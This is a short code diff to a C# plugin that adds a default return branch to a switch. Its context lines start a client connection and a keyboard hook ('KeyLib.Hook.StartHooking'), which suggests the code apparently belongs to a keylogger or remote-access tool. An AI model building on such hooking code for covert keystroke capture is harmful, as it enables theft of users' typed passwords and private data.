@@ -29,6 +29,9 @@ namespace Plugin
                     clientHandler.ConnectStart();
                     KeyLib.Hook.StartHooking();
                     break;
+
+                default:
+                    return;
             }
             Miscellaneous.CleanMemory();
         }
